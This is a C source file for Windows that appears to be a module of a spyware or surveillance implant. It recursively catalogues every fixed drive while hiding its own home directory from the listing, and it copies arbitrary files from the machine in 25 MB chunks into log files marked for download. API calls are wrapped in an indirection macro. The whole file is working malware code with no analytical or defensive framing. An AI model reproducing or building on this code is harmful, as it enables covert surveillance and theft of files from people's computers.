#include <windows.h>
#include <stdio.h>
#include "common.h"
#include "bin_string.h"
#include "LOG.h"

typedef struct {
#define DIR_EXP_VERSION 2010031501
	DWORD version;
	DWORD path_len;
#define PATH_IS_DIRECTORY 1
#define PATH_IS_EMPTY     2
	DWORD flags;
	DWORD file_size_lo;
	DWORD file_size_hi;
	FILETIME last_write;
} directory_header_struct;

WCHAR *CompleteDirectoryPath(WCHAR *start_path, WCHAR *file_name, WCHAR *dest_path)
{
	WCHAR *term;

	_snwprintf_s(dest_path, MAX_PATH, _TRUNCATE, L"%s", start_path);	
	if ( (term = wcsrchr(dest_path, L'\\')) ) {
		term++;
		*term = NULL;
		_snwprintf_s(dest_path, MAX_PATH, _TRUNCATE, L"%s%s", dest_path, file_name);	
	} 
		
	return dest_path;
}

WCHAR *RecurseDirectory(WCHAR *start_path, WCHAR *recurse_path)
{
	_snwprintf_s(recurse_path, MAX_PATH, _TRUNCATE, L"%s\\*", start_path);	
	return recurse_path;
}

// Ritorna FALSE se la esplora ed e' vuota oppure se non e' valida
BOOL ExploreDirectory(HANDLE hdest, WCHAR *start_path, DWORD depth)
{
	WIN32_FIND_DATAW finddata;
	HANDLE hfind;
	BOOL is_full = FALSE;
	directory_header_struct directory_header;
	WCHAR file_path[MAX_PATH], recurse_path[MAX_PATH];
	WCHAR hidden_path[MAX_PATH];

	if (hdest==NULL || hdest==INVALID_HANDLE_VALUE || start_path==NULL)
		return FALSE;

	if (depth==0)
		return TRUE;

	_snwprintf_s(hidden_path, MAX_PATH, _TRUNCATE, L"%S", H4_HOME_DIR);		

	// Bisogna partire dalla lista dei drive
	if (!wcscmp(start_path, L"/")) {
		WCHAR drive_letter[3];
		
		drive_letter[1]=L':';
		drive_letter[2]=0;

		for (drive_letter[0]=L'A'; drive_letter[0]<=L'Z'; drive_letter[0]++) {
			if (FNC(GetDriveTypeW)(drive_letter) == DRIVE_FIXED) {
				ZeroMemory(&directory_header, sizeof(directory_header_struct));
				directory_header.version = DIR_EXP_VERSION;
				directory_header.flags |= PATH_IS_DIRECTORY;
				directory_header.path_len = wcslen(drive_letter)*2;
				if (!ExploreDirectory(hdest, RecurseDirectory(drive_letter, recurse_path), depth-1))
					directory_header.flags |= PATH_IS_EMPTY;
				
				bin_buf tolog;
				tolog.add(&directory_header, sizeof(directory_header));
				tolog.add(drive_letter, directory_header.path_len);
				Log_WriteFile(hdest, tolog.get_buf(), tolog.get_len());
			}
		}
		return TRUE;
	}

	hfind = FNC(FindFirstFileW)(start_path, &finddata);
	if (hfind == INVALID_HANDLE_VALUE)
		return FALSE;

	do {
		if (!wcscmp(finddata.cFileName, L".") || !wcscmp(finddata.cFileName, L"..") || !wcscmp(finddata.cFileName, hidden_path))
			continue;

		is_full = TRUE;
		ZeroMemory(&directory_header, sizeof(directory_header_struct));
		directory_header.version = DIR_EXP_VERSION;
		directory_header.file_size_hi = finddata.nFileSizeHigh;
		directory_header.file_size_lo = finddata.nFileSizeLow;
		directory_header.last_write = finddata.ftLastWriteTime;
		if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			directory_header.flags |= PATH_IS_DIRECTORY;
		CompleteDirectoryPath(start_path, finddata.cFileName, file_path);
		directory_header.path_len = wcslen(file_path)*2;

		if (directory_header.flags & PATH_IS_DIRECTORY) 
			if (!ExploreDirectory(hdest, RecurseDirectory(file_path, recurse_path), depth-1))
				directory_header.flags |= PATH_IS_EMPTY;

		bin_buf tolog;
		tolog.add(&directory_header, sizeof(directory_header));
		tolog.add(file_path, directory_header.path_len);
		Log_WriteFile(hdest, tolog.get_buf(), tolog.get_len());
		
	} while(FNC(FindNextFileW)(hfind, &finddata));
	FNC(FindClose)(hfind);
	return is_full;
}

#define MAX_DOWNLOAD_CHUNK_SIZE (25*1024*1024)
BOOL CopyDownloadFile(WCHAR *src_path, WCHAR *display_name)
{
	FileAdditionalData *download_adh;
	BYTE *read_buffer;
	WCHAR *log_file_name;
	WCHAR chunk_file_name[MAX_PATH];
	DWORD adh_len, chunk_count=1, chunk_size, total_chunk_count;
	DWORD  file_len_lo, file_len_hi, dwRead;
	HANDLE hdst, hsrc;

	// Vede come si dovra' chiamare il file nel log
	if (!src_path) 
		return FALSE;
	log_file_name = src_path;
	if (display_name)
		log_file_name = display_name;

	// Apre il file e ne prende la dimensione
	hsrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hsrc == INVALID_HANDLE_VALUE)
		return FALSE;

	file_len_lo = FNC(GetFileSize)(hsrc, &file_len_hi);
	if (file_len_lo==INVALID_FILE_SIZE || file_len_hi>0) {
		CloseHandle(hsrc);
		return FALSE;
	}
	// Calcola quanti chunk occupera'
	total_chunk_count = file_len_lo/MAX_DOWNLOAD_CHUNK_SIZE;
	total_chunk_count++;

	// Alloca il buffer di lettura
	read_buffer = (BYTE *)malloc(MAX_DOWNLOAD_CHUNK_SIZE);
	if (!read_buffer) {
		CloseHandle(hsrc);
		return FALSE;
	}

	// Cicla per tutti i chunk
	do {
		// Crea il nome del chunk
		if (total_chunk_count > 1)
			_snwprintf_s(chunk_file_name, MAX_PATH, _TRUNCATE, L"%s [%d of %d]", log_file_name, chunk_count, total_chunk_count);		
		else
			_snwprintf_s(chunk_file_name, MAX_PATH, _TRUNCATE, L"%s", log_file_name);		

		// Calcola la dimensione del chunk
		chunk_size = file_len_lo;
		if (chunk_size > MAX_DOWNLOAD_CHUNK_SIZE)
			chunk_size = MAX_DOWNLOAD_CHUNK_SIZE;
		file_len_lo -= chunk_size;
		chunk_count++;

		// Crea l'additional header
		adh_len = sizeof(FileAdditionalData) + wcslen(chunk_file_name) * sizeof(WCHAR);
		if ( !(download_adh = (FileAdditionalData *)malloc(adh_len)))
			break;
		download_adh->uVersion = LOG_FILE_VERSION;
		download_adh->uFileNameLen = wcslen(chunk_file_name) * sizeof(WCHAR);
		memcpy(download_adh+1, chunk_file_name, download_adh->uFileNameLen);

		// Crea il file di log
		hdst = Log_CreateFile(PM_DOWNLOAD, (BYTE *)download_adh, adh_len);
		SAFE_FREE(download_adh);

		// Legge e scrive il chunk
		dwRead = 0;
		if (!FNC(ReadFile)(hsrc, read_buffer, chunk_size, &dwRead, NULL) ) {
			Log_CloseFile(hdst);
			break;
		}
		if (!Log_WriteFile(hdst, read_buffer, dwRead)) {
			Log_CloseFile(hdst);
			break;
		}
		Log_CloseFile(hdst);
	} while(file_len_lo > 0);

	SAFE_FREE(read_buffer);
	CloseHandle(hsrc);
	return TRUE;
}